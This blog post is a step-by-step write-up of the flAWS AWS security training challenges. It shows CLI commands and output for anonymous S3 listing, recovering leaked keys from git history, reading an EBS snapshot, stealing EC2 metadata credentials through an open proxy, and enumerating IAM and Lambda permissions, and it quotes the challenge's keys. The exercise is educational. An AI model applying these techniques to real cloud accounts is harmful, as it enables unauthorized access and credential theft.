@@ -1,0 +1,816 @@
+---
+layout: post
+title: "Cloud Security at AWS: flAWS"
+header-img: "img/hacker-1.jpeg"
+author: "Adrià"
+catalog: true
+date: 2023-02-18
+tags:
+  - Cloud Security
+  - AWS
+---
+
+Since I joined Datadog's Cloud SIEM team (in October 2021), I haven't stopped being surrounded by security nerds (something I deeply love). For me computer security was a totally unknown subject (my old job was focused on artificial intelligence) so I have learned a lot. Topics like [ebpf](https://ebpf.io/) or [CSPM](https://www.datadoghq.com/product/security-platform/cloud-security-posture-management/) were totally unknown to me. 
+
+This post will be about security focused on the cloud, more specifically Amazon Web Services. I will try to solve [flAWS](http://flaws.cloud/), a series of challenges designed to learn the most common mistakes that can be made with AWS and their consequences. There are no SQL injections, XSS or buffer overflows, only AWS specific issues. 
+
+
+## Level 1
+
+If we go to the main page, we see that the initial level challenges us to find a first subdomain:
+
+> This level is *buckets* of fun. See if you can find the first sub-domain.
+
+The fact that *buckets* is mentioned leads us to think that the page is in a bucket... Let's try to at where it is hosted:
+
+```
+❯ host flaws.cloud
+flaws.cloud has address 52.92.194.195
+
+❯ nslookup 52.92.194.195
+Server:		8.8.8.8
+Address:	8.8.8.8#53
+
+Non-authoritative answer:
+195.194.92.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
+```
+Indeed we can see that it hosted inside an S3 bucket.
+
+> FUN FACT: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is you could create a bucket named apple.com and Apple would never be able host their main site via S3 hosting.
+
+
+Now we know that it is hosted on us-west-2. Let's try to list the buckets (for this you will have to install the [aws CLI](https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html)):
+
+```
+% aws s3 ls s3://flaws.cloud/ --region us-west-2 
+Unable to locate credentials. You can configure credentials by running "aws configure".
+```
+
+It doesn't seem to work. What if we to skip the signing step with ```--no-sign-request.```?
+
+```
+❯ aws s3 ls s3://flaws.cloud/ --region us-west-2  --no-sign-request
+2017-03-14 04:00:38       2575 hint1.html
+2017-03-03 05:05:17       1707 hint2.html
+2017-03-03 05:05:11       1101 hint3.html
+2020-05-22 20:16:45       3162 index.html
+2018-07-10 18:47:16      15979 logo.png
+2017-02-27 02:59:28         46 robots.txt
+2017-02-27 02:59:30       1051 secret-dd02c7c.html
+```
+
+Yay! We can see the files inside the bucket. The file **secret-dd02c7c.html**, looks very suspicious. Let's take a look at its contents:
+
+```
+❯ aws s3 cp s3://flaws.cloud/secret-dd02c7c.html  --region us-west-2  --no-sign-request flaws
+```
+
+<div align="center">
+<img src="/img/flaws/level1.png" width="120%" alt="First level solved!">
+</div>
+
+## Level 2
+
+Here I guess we have another problem with the permissions given to the bucket. If we try to make the same call we get an access Denied: from making the same call as before: 
+
+```
+adria.cabezasantanna@COMP-C02G61KFML87 [00:21:22] [~/flaws]
+❯ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request
+
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
+```
+
+So you have most likely changed the permissions and they are no longer set to all users. If we look in the documentation, there are other predefined groups that can be critical such as the Authenticated Users group that allows any authenticated AWS user in the world to access the resource:  `http://acs.amazonaws.com/groups/global/AuthenticatedUsers`.
+
+We have to create an AWS account to continue. In this case I will take advantage of my personal one where I only use free tier.
+
+ In order to continue you will need to create an accessKeyID: 
+
+
+
+<div align="center">
+<img src="/img/flaws/configurar_access_key.png" width="120%" alt="Configure Access Key">
+</div>
+
+
+And configure your profile using the csv that AWS returns to you:
+```
+❯ aws configure import --csv file://credentials.csv  --profile adriacabeza
+```
+
+```
+❯ aws s3 --profile adriacabeza ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-27 03:02:15      80751 everyone.png
+2017-03-03 04:47:17       1433 hint1.html
+2017-02-27 03:04:39       1035 hint2.html
+2017-02-27 03:02:14       2786 index.html
+2017-02-27 03:02:14         26 robots.txt
+2017-02-27 03:02:15       1051 secret-e4443fc.html
+❯ aws s3 --profile adriacabeza cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html .
+❯ cat secret-e4443fc.html
+```
+
+<div align="center">
+<img src="/img/flaws/solution2.png" width="110%">
+</div>
+
+
+Let's go to the next level! http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+
+Real example that was bonused with 1000 dollars: [Shopify's Amazon S3 Buckets](https://hackerone.com/reports/98819)
+
+## Level 3
+
+We have to do something similar, but this time using our first AWS Key. Interesting. Let's try first to do the same as before
+
+<div align="center">
+<img src="/img/flaws/contenido_level3.png" width="110%">
+</div>
+
+
+It seems that the only content we can see is that of the web page. Although... that ````.git``` is new. Maybe if we look at the git history we can find some kind of key. 
+
+```
+❯ aws s3 sync --profile adriacabeza s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .
+❯ ls .git/
+COMMIT_EDITMSG  HEAD  config  description  hooks  index  info  logs  objects  refs
+```
+
+If we look at the logs it seems that we are right. He unintentionally committed something he didn't want (the accessKey) and instead of deleting the commit and revoking the key, he made another commit deleting the file. 
+
+```
+❯ git log
+commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
+Author: 0xdabbad00 <scott@summitroute.com>
+Date:   Sun Sep 17 09:10:43 2017 -0600
+
+    Oops, accidentally added something I shouldn't have
+
+commit f52ec03b227ea6094b04e43f475fb0126edb5a61
+Author: 0xdabbad00 <scott@summitroute.com>
+Date:   Sun Sep 17 09:10:07 2017 -0600
+
+    first commit
+(END)
+```
+
+Let's try to checkout this commit and see what we find. 
+
+```
+❯ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+M	index.html
+Previous HEAD position was b64c8dc Oops, accidentally added something I shouldn't have
+HEAD is now at f52ec03 first commit
+```
+
+E voila, we already have the access keys. 
+```
+diff --git a/access_keys.txt b/access_keys.txt
+new file mode 100644
+index 0000000..e3ae6dd
+--- /dev/null
++++ b/access_keys.txt
+@@ -0,0 +1,2 @@
++access_key AKIAJ366LIPB4IJKT7SA
++secret_access_key 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
+diff --git a/index.html b/index.html
+index db93223..1aff726 100644
+--- a/index.html
++++ b/index.html
+@@ -38,6 +38,8 @@ Only open permissions to specific AWS users.
+
+ <img style="max-width:500px" src="./authenticated_users.png">
+
++This screenshot is from the webconsole in 2017. This setting can no longer be set in the webconsole, but the SDK and third-party tools sometimes allow it.^M
++^M
+ <hr size=3 color="#00d000" />
+ <h1>Level 3</h1>
+ The next level is fairly similar, with a slight twist.  Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
+(END)
+```
+
+With this we can create a profile with that data and see all the buckets that the profile has. 
+
+```
+❯ aws --profile flaws s3 ls
+2017-02-12 22:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-05-29 18:34:53 config-bucket-975426262029
+2017-02-12 21:03:24 flaws-logs
+2017-02-05 04:40:07 flaws.cloud
+2017-02-24 02:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 19:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-26 19:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-26 20:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-26 20:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-26 21:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+```
+
+And with this we can move to the next level.
+
+Real Example: Instagram's Million Dollar Bug http://www.exfiltrated.com/research-Instagram-RCE.php 
+
+> Cool fact: if you give someone the permission to list buckets, they will be able to list all of them. You cannot restrict the ability to list only certain buckets. To avoid the problem a common practice is to role secrets frequently as practice (i.e. revoke keys and generate new ones).  
+
+## Level 4
+
+In this level we are challenged to access the following page: 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud, which is hosted on an EC2 instance. 
+
+If we access the page the first thing we are shown is a signin form. 
+
+<br>
+<div align="center">
+<img src="/img/flaws/signin.png" width="100%">
+</div>
+
+As a hint, it tells us that a snapshot of the page was taken just after nginx (the reverse proxy) was set up, which redirects us to the page. It could be that the snapshots were saved in S3. Let's check it: 
+
+
+```
+❯ aws s3 ls --profile flaws s3://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
+```
+
+It seems that we don't have permissions to ListObjects in the bucket. Better try something else. We can try to describe the snapshots available with `describe-snapshots`: https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-snapshots.html
+
+```
+aws --profile flaws ec2 describe-snapshots --region us-west-2
+```
+
+The command returns a lot of snapshots but there is one that looks particularly interesting: snap-0b49342abd1bdcb89 as it is tagged with the name "flaws backup 2017.02.27". Let's try to see what's inside that snapshot. 
+
+To see it, we will have to create an EC2 instance, attach a volume with that snapshot, enter the instance (with ssh) and see what it has. Creating a standard t2.micro instance (available in the free tier) will be enough. 
+
+Now we can create a volume with the snapshot (remember to use the same region and availability zone as the EC2 instance you just created):
+
+```
+❯ aws --profile adriacabeza ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89
+{
+    "AvailabilityZone": "us-west-2a",
+    "CreateTime": "2022-07-10T17:27:20.000Z",
+    "Encrypted": false,
+    "Size": 8,
+    "SnapshotId": "snap-0b49342abd1bdcb89",
+    "State": "creating",
+    "VolumeId": "vol-0cc196d0db905d26a",
+    "Iops": 100,
+    "Tags": [],
+    "VolumeType": "gp2",
+    "MultiAttachEnabled": false
+}
+```
+and then we should be able to see the volume created on the AWS page and attach it to the EC2 instance:
+
+
+<div align="center">
+<img src="/img/flaws/volumen.png" width="100%" alt="Created volume">
+<br>
+<img src="/img/flaws/attach_volumen.png" width="100%" alt="Attach volume">
+</div>
+
+
+Now let's log into the EC2 instance:
+```
+ssh -i key.pem user@instancia.us-west-2.compute.amazonaws.com
+```
+
+
+#### Small note: Permissions
+ If you get an error like this when you ssh to the instance:
+```
+This private key will be ignored.
+Load key "adriacabeza.pem": bad permissions
+ubuntu@ec2-52-38-227-75.us-west-2.compute.amazonaws.com: Permission denied (publickey).
+```
+
+remember that the permissions of the keys are not correct by default:
+```
+❯ chmod 400 adriacabeza.pem
+```
+
+Now we have to mount the volume on the instance. 
+
+1. First we list the available disks in the instance with the following command:
+
+```
+[ec2-user@ip-172-31-8-67 ~]$ lsblk
+NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
+xvda    202:0    0   8G  0 disk
+└─xvda1 202:1    0   8G  0 part /
+xvdf    202:80   0   8G  0 disk
+└─xvdf1 202:81   0   8G  0 part
+```
+
+2. We check if the volume has data with the following command:
+
+```
+[ec2-user@ip-172-31-8-67 ~]$ sudo file -s /dev/xvdf1
+/dev/xvdf1: Linux rev 1.0 ext4 filesystem data, UUID=5a2075d0-d095-4511-bef9-802fd8a7610e, volume name "cloudimg-rootfs" (needs journal recovery) (extents) (large files) (huge files)
+```
+if the command returns ````/dev/xvdf: data``` it means that it is empty.
+ 
+3. Mount the volume with the following command:
+
+```
+[ec2-user@ip-172-31-8-67 ~]$ sudo mount /dev/xvdf1 /mnt
+```
+
+Now we can investigate a bit what is contained in the volume. Initially, after exploring a bit, I found the hidden file ```.httpaswwd``` which contained the user and the hashed password with [APR1](https://asecuritysite.com/encryption/apr1#:~:text=The%20Apache%2Ddefined%20APR1%20hashing,a%2048%2Dbit%20salt%20value)]. 
+```
+flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0
+```
+Could I crack it? 
+
+I tried to do so after installing John the Ripper (```brew install john-jumbo```) and... nothing. Also tried using a [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt) and did not work either. 
+
+Humm... maybe I had missed something. I spent 10 minutes more going through the different directories and... found!
+
+
+```
+[ec2-user@ip-172-31-8-67 ubuntu]$ cd /mnt
+[ec2-user@ip-172-31-8-67 mnt]$ ls
+bin   etc         initrd.img.old  lost+found  opt   run   srv  usr      vmlinuz.old
+boot  home        lib             media       proc  sbin  sys  var
+dev   initrd.img  lib64           mnt         root  snap  tmp  vmlinuz
+[ec2-user@ip-172-31-8-67 mnt]$ cd home/
+[ec2-user@ip-172-31-8-67 home]$ ls
+ubuntu
+[ec2-user@ip-172-31-8-67 home]$ cd ubuntu/
+[ec2-user@ip-172-31-8-67 ubuntu]$ ls
+meta-data  setupNginx.sh
+[ec2-user@ip-172-31-8-67 ubuntu]$ cat setupNginx.sh
+htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
+```
+
+(of course John The Ripper did not work, I was trying to crack a random 32 characters password 🤦🏽‍♂️)
+
+<div align="center">
+<img src="/img/flaws/level4.png" width="80%">
+</div>
+
+
+Yay! It worked! Let's go to [level 5](http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
+).
+
+## Level 5
+
+This level is about an EC2 instance that has a simple HTTP only proxy. It gives you some examples of how the proxy works and it challenges you to find a hidden directory in the [level 6](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/) bucket. 
+
+We know that it is an EC2 instance and that is is simply proxying HTTP requests. What if we could access to some credentials? Maybe the instance has an IAM role attached to it or something. Let's try to access to its metadata service 169.254.169.254/latest/meta-data using the proxy: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data:
+
+```
+ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/
+events/
+hostname
+iam/
+identity-credentials/
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+local-hostname
+local-ipv4
+mac
+metrics/
+network/
+placement/
+profile
+public-hostname
+public-ipv4
+public-keys/
+reservation-id
+security-groups
+services/
+system
+```
+
+Nice! We can access it using the proxy. If we take a look at iam we can find the role flaws and its credentials: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
+
+```
+{
+  "Code" : "Success",
+  "LastUpdated" : "2023-02-18T22:33:02Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA6GG7PSQGRPBSUS5L",
+  "SecretAccessKey" : "zzdvB0HN0tQ2VTapW2K2/zqV4emQTp3meOe+TYxk",
+  "Token" : "IQoJb3JpZ2luX2VjEOf//////////wEaCXVzLXdlc3QtMiJIMEYCIQC0vzRqWW+V6t1+Hq2vOsrZmfVvz9H/vm/2jAYTd44iggIhAMx0oRDGZcNBPbk+dIHJaq7NWcJ1Ku4RISOAKr6/dJlaKtUECID//////////wEQAxoMOTc1NDI2MjYyMDI5IgyiUIHl1etmpdMRhx4qqQRs/XEPi6SpjNiaCvEi0O9Yi6eV2uoKR4dtywZTVwZTGxce+VxBKBIMoARQKcVbCPhhsKNSaX+8hU/GGABM38OATRmlPPCE36JifEXogIaciKXi72rpHloMG2/tCvOoB+Lj78+ZgJ8+B9fTvD3QOp28gOVvqJSCPPX3xmaJUxgclGHNHcYopUY9QmjsWgm7Z8mUIyRJjGvBOyeXyz03GqyXP81ycj1PjXP51lv09y8yejOCoLyB4hWVHs9D7rOUBZz/Nd89Ynlgtsw+VPyVibrIWluQa9fEUIG0ItOKgx3Pk271gLiGyHTc/aNFdh6Ex4dJKdLWCBsBfn2eDhHK70xuBHSgWdPe5pnH+dzvu50DrNYDn/Amv0i7V0wLvpkIaeUJ0L65OCEgSC84NF1jRl09ZVzuQKTcTgpqUJ3OZpT7Ftiu0FPM2uXi93LKjgBmT5YQlZzpftEHmBIB5YV2StzPUb4/+qy/54yQ/HUyTd8ep/L6Sl5YQ5jtwOVcxeHLsg++DrfmjuuFcIpt+Bty80wrkE8Faov02g4Zc92En4WafG7pnVvM7f/Rb9xv/IZTYK/J4+jT0BOEbh+Fnp6kqZl5dpNqI8hynZqzrI6PzF1G375J+Q19rqE6M2ddnX1soH5U3cRFp4f2gSF44zAezUaCIT1NXW7ueP0iLXgz8sprs4QNX8DKn4x+uSmuhRgrAoU8OHnPsMVhddsOezMLCxtRsBMH6SGqo1uWMIukxZ8GOqgBxRibcomjhGOzkZpNKOXxA5yWstORbZSHxSn3+rAyzJMoNJ+De88/FEM/FpCLho/43EeHP1mhtgi6B7UYRnkoMZg12BZxEHHnZAHU1vEGFB7JjoRfMI1424IIRqJl6kQh2y//Jcvr5GIxPLrbGAu5buYb8IXzCPsDwJlKMh3UrYPMOa/+z71g6xsj0DTYueEhoSt5GZeK7FqVu+poaNYU7EDYLSAIq/TD",
+  "Expiration" : "2023-02-19T04:45:08Z"
+}
+```
+
+If we use those credentials to see the content of that bucket we discover there is another folder called ```ddcc78ff/```:
+<div align="center">
+<img src="/img/flaws/instance-metadata.png" width="80%">
+</div>
+
+That [subdirectory shows a page](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/) explaining the last challenge 🙌
+
+<div align="center">
+<img src="/img/flaws/level6.png" width="80%">
+</div>
+
+
+ ## Level 6: the last one
+
+ This level was quite hard ngl. Being honest with you, I got stucked for a long time and was not able to solve it without taking a look at the hints 😢. The challenge gives you an access key id and a secret access key and tells you that the user has the Security Audit policy attached to it.
+
+ [Based on the AWS documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html), a Security Audit managed policy is used to monitor accounts for compliance with security requirements. The user can access logs and events to investigate potential security breaces or potential malicious activity. Interesting...
+
+After adding a profile with those credentials we can start looking around. 
+
+ ```
+ ❯  aws iam get-user --profile level6
+ {
+    "User": {
+        "Path": "/",
+        "UserName": "Level6",
+        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
+        "Arn": "arn:aws:iam::975426262029:user/Level6",
+        "CreateDate": "2017-02-26T23:11:16Z"
+    }
+}
+```
+Now we know that the username is Level6. Let's list the attached user policies: 
+```
+ ❯ aws iam list-attached-user-policies --user-name Level6 --profile level6
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "MySecurityAudit",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
+        },
+        {
+            "PolicyName": "list_apigateways",
+            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
+        }
+    ]
+}
+```
+
+As mentioned in the challenge, we have an attached policy called MySecurityAudit. If we take a look at it, we can see it allows us to do a lot of things. 
+
+```
+❯ aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --profile level6
+{
+    "Policy": {
+        "PolicyName": "MySecurityAudit",
+        "PolicyId": "ANPAJCK5AS3ZZEILYYVC6",
+        "Arn": "arn:aws:iam::975426262029:policy/MySecurityAudit",
+        "Path": "/",
+        "DefaultVersionId": "v1",
+        "AttachmentCount": 1,
+        "PermissionsBoundaryUsageCount": 0,
+        "IsAttachable": true,
+        "Description": "Most of the security audit capabilities",
+        "CreateDate": "2019-03-03T16:42:45Z",
+        "UpdateDate": "2019-03-03T16:42:45Z",
+        "Tags": []
+    }
+}
+
+# from this output we can get the version which allows us to get more information
+
+❯ aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit --version-id v1 --profile level6
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": [
+                        "acm:Describe*",
+                        "acm:List*",
+                        "application-autoscaling:Describe*",
+                        "athena:List*",
+                        "autoscaling:Describe*",
+                        "batch:DescribeComputeEnvironments",
+                        "batch:DescribeJobDefinitions",
+                        "clouddirectory:ListDirectories",
+                        "cloudformation:DescribeStack*",
+                        "cloudformation:GetTemplate",
+                        "cloudformation:ListStack*",
+                        "cloudformation:GetStackPolicy",
+                        "cloudfront:Get*",
+                        "cloudfront:List*",
+                        "cloudhsm:ListHapgs",
+                        "cloudhsm:ListHsms",
+                        "cloudhsm:ListLunaClients",
+                        "cloudsearch:DescribeDomains",
+                        "cloudsearch:DescribeServiceAccessPolicies",
+                        "cloudtrail:DescribeTrails",
+                        "cloudtrail:GetEventSelectors",
+                        "cloudtrail:GetTrailStatus",
+                        "cloudtrail:ListTags",
+                        "cloudwatch:Describe*",
+                        "codebuild:ListProjects",
+                        "codedeploy:Batch*",
+                        "codedeploy:Get*",
+                        "codedeploy:List*",
+                        "codepipeline:ListPipelines",
+                        "codestar:Describe*",
+                        "codestar:List*",
+                        "cognito-identity:ListIdentityPools",
+                        "cognito-idp:ListUserPools",
+                        "cognito-sync:Describe*",
+                        "cognito-sync:List*",
+                        "datasync:Describe*",
+                        "datasync:List*",
+                        "dax:Describe*",
+                        "dax:ListTags",
+                        "directconnect:Describe*",
+                        "dms:Describe*",
+                        "dms:ListTagsForResource",
+                        "ds:DescribeDirectories",
+                        "dynamodb:DescribeContinuousBackups",
+                        "dynamodb:DescribeGlobalTable",
+                        "dynamodb:DescribeTable",
+                        "dynamodb:DescribeTimeToLive",
+                        "dynamodb:ListBackups",
+                        "dynamodb:ListGlobalTables",
+                        "dynamodb:ListStreams",
+                        "dynamodb:ListTables",
+                        "ec2:Describe*",
+                        "ecr:DescribeRepositories",
+                        "ecr:GetRepositoryPolicy",
+                        "ecs:Describe*",
+                        "ecs:List*",
+                        "eks:DescribeCluster",
+                        "eks:ListClusters",
+                        "elasticache:Describe*",
+                        "elasticbeanstalk:Describe*",
+                        "elasticfilesystem:DescribeFileSystems",
+                        "elasticloadbalancing:Describe*",
+                        "elasticmapreduce:Describe*",
+                        "elasticmapreduce:ListClusters",
+                        "elasticmapreduce:ListInstances",
+                        "es:Describe*",
+                        "es:ListDomainNames",
+                        "events:DescribeEventBus",
+                        "events:ListRules",
+                        "firehose:Describe*",
+                        "firehose:List*",
+                        "fsx:Describe*",
+                        "fsx:List*",
+                        "gamelift:ListBuilds",
+                        "gamelift:ListFleets",
+                        "glacier:DescribeVault",
+                        "glacier:GetVaultAccessPolicy",
+                        "glacier:ListVaults",
+                        "globalaccelerator:Describe*",
+                        "globalaccelerator:List*",
+                        "greengrass:List*",
+                        "guardduty:Get*",
+                        "guardduty:List*",
+                        "iam:GenerateCredentialReport",
+                        "iam:Get*",
+                        "iam:List*",
+                        "iam:SimulateCustomPolicy",
+                        "iam:SimulatePrincipalPolicy",
+                        "iot:Describe*",
+                        "iot:List*",
+                        "kinesis:DescribeStream",
+                        "kinesis:ListStreams",
+                        "kinesis:ListTagsForStream",
+                        "kinesisanalytics:ListApplications",
+                        "kms:Describe*",
+                        "kms:List*",
+                        "lambda:GetAccountSettings",
+                        "lambda:GetPolicy",
+                        "lambda:List*",
+                        "license-manager:List*",
+                        "logs:Describe*",
+                        "logs:ListTagsLogGroup",
+                        "machinelearning:DescribeMLModels",
+                        "mediaconnect:Describe*",
+                        "mediaconnect:List*",
+                        "mediastore:GetContainerPolicy",
+                        "mediastore:ListContainers",
+                        "opsworks-cm:DescribeServers",
+                        "organizations:List*",
+                        "quicksight:Describe*",
+                        "quicksight:List*",
+                        "ram:List*",
+                        "rds:Describe*",
+                        "rds:DownloadDBLogFilePortion",
+                        "rds:ListTagsForResource",
+                        "redshift:Describe*",
+                        "rekognition:Describe*",
+                        "rekognition:List*",
+                        "robomaker:Describe*",
+                        "robomaker:List*",
+                        "route53:Get*",
+                        "route53:List*",
+                        "route53domains:GetDomainDetail",
+                        "route53domains:GetOperationDetail",
+                        "route53domains:ListDomains",
+                        "route53domains:ListOperations",
+                        "route53domains:ListTagsForDomain",
+                        "route53resolver:List*",
+                        "s3:ListAllMyBuckets",
+                        "sagemaker:Describe*",
+                        "sagemaker:List*",
+                        "sdb:DomainMetadata",
+                        "sdb:ListDomains",
+                        "securityhub:Get*",
+                        "securityhub:List*",
+                        "serverlessrepo:GetApplicationPolicy",
+                        "serverlessrepo:List*",
+                        "sqs:GetQueueAttributes",
+                        "sqs:ListQueues",
+                        "ssm:Describe*",
+                        "ssm:ListDocuments",
+                        "storagegateway:List*",
+                        "tag:GetResources",
+                        "tag:GetTagKeys",
+                        "transfer:Describe*",
+                        "transfer:List*",
+                        "translate:List*",
+                        "trustedadvisor:Describe*",
+                        "waf:ListWebACLs",
+                        "waf-regional:ListWebACLs",
+                        "workspaces:Describe*"
+                    ],
+                    "Resource": "*",
+                    "Effect": "Allow"
+                }
+            ]
+        },
+        "VersionId": "v1",
+        "IsDefaultVersion": true,
+        "CreateDate": "2019-03-03T16:42:45Z"
+    }
+}
+```
+"Too many things, too much information", I thought. Let's look at the other one:
+
+```
+❯ aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6
+{
+    "Policy": {
+        "PolicyName": "list_apigateways",
+        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
+        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
+        "Path": "/",
+        "DefaultVersionId": "v4",
+        "AttachmentCount": 1,
+        "PermissionsBoundaryUsageCount": 0,
+        "IsAttachable": true,
+        "Description": "List apigateways",
+        "CreateDate": "2017-02-20T01:45:17Z",
+        "UpdateDate": "2017-02-20T01:48:17Z",
+        "Tags": []
+    }
+}
+
+❯  aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": [
+                        "apigateway:GET"
+                    ],
+                    "Effect": "Allow",
+                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
+                }
+            ]
+        },
+        "VersionId": "v4",
+        "IsDefaultVersion": true,
+        "CreateDate": "2017-02-20T01:48:17Z"
+    }
+}
+```
+Interesting... this is telling us that using this policy we can call ```apigateway:GET``` on ```arn:aws:apigateway:us-west-2::/restapis/*```.
+
+```
+❯ aws apigateway get-rest-apis --region us-west-2 --profile level6
+
+An error occurred (AccessDeniedException) when calling the GetRestApis operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: apigateway:GET on resource: arn:aws:apigateway:us-west-2::/restapis because no identity-based policy allows the apigateway:GET action
+```
+
+Hum... that is weird. How is this possible? I can not perform a ```get-rest-apis``` even though the user seems that it has a policy attached that allows it. That felt like a dead end. 
+
+I tried to go back to the Security Audit policy topic and see if could find something useful in Cloudtrail (it made sense for me to look for something there as it is likely related to that policy):
+
+```
+❯ aws cloudtrail describe-trails --profile level6
+{
+    "trailList": [
+        {
+            "Name": "summitroute-logs",
+            "S3BucketName": "summitroute-logs",
+            "IncludeGlobalServiceEvents": true,
+            "IsMultiRegionTrail": true,
+            "HomeRegion": "us-east-1",
+            "TrailARN": "arn:aws:cloudtrail:us-east-1:763647780161:trail/summitroute-logs",
+            "LogFileValidationEnabled": true,
+            "HasCustomEventSelectors": false,
+            "HasInsightSelectors": false,
+            "IsOrganizationTrail": true
+        }
+    ]
+}
+```
+
+As we can see, CloudTrail was activated but sadly I could not take a look at the events of the trail. 
+
+```
+❯ aws cloudtrail lookup-events --profile level6
+
+An error occurred (AccessDeniedException) when calling the LookupEvents operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: cloudtrail:LookupEvents because no identity-based policy allows the cloudtrail:LookupEvents action
+```
+
+
+Alright, it was time to look at the hints. Turns out that API Gateway is typically used in conjunction with Lambda functions, so the proper way to continue was to take a look at the lambda functions. 
+
+```
+❯ aws --region us-west-2 lambda list-functions --profile level6
+{
+    "Functions": [
+        {
+            "FunctionName": "Level6",
+            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
+            "Runtime": "python2.7",
+            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
+            "Handler": "lambda_function.lambda_handler",
+            "CodeSize": 282,
+            "Description": "A starter AWS Lambda function.",
+            "Timeout": 3,
+            "MemorySize": 128,
+            "LastModified": "2017-02-27T00:24:36.054+0000",
+            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
+            "Version": "$LATEST",
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979",
+            "PackageType": "Zip",
+            "Architectures": [
+                "x86_64"
+            ],
+            "EphemeralStorage": {
+                "Size": 512
+            },
+            "SnapStart": {
+                "ApplyOn": "None",
+                "OptimizationStatus": "Off"
+            }
+        }
+    ]
+}
+```
+
+If we list the lambda functions we can find one called Level6. If we take a look into the policy:
+
+```
+❯  aws lambda get-policy --function-name Level6 --profile level6
+
+{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
+    "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979"
+}
+```
+
+we can see that we can execute ```arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\``` and ```s33ppypa75``` is the rest-api-id. 
+
+Then we simply need to get the full path. For that we need to get the stage name as we must complete the ```https://<rest-api-id>.execute-api.<region>.amazonaws.com/<stage-name>/<lambda function>```format:
+
+```
+❯ aws --profile level6 apigateway get-stages --rest-api-id "s33ppypa75"
+
+{
+    "item": [
+        {
+            "deploymentId": "8gppiv",
+            "stageName": "Prod",
